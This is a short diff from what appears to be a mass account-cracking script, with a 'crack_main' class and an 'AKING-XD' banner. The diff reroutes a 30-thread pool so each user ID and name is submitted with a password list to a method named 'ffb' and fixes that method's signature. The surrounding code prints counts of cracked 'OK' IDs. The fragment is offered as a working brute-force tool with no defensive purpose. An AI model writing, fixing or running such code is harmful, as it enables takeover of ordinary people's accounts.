@@ -553,7 +553,7 @@ class crack_main():
                 with ThreadPool(max_workers=30) as formSubmit:
                         for user in self.id:
                                 iid,name = user.split('|')
-                                formSubmit.submit(self.rndm,iid,name,passlist)
+                                formSubmit.submit(self.ffb,iid,name,passlist)
                 print(50*'=')
                 print(' SucessFully Process Is Completed ')
                 print(' Total Ok Ids : '+str(len(ok)))
@@ -561,7 +561,7 @@ class crack_main():
                 print(50*'=')
                 input('\n Press enter to back ')
                 main()
-        def ffb(ids,name,passlist):
+        def ffb(self,iid,name,passlist):
                 global loop,oks,cps
                 sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 session = requests.Session()
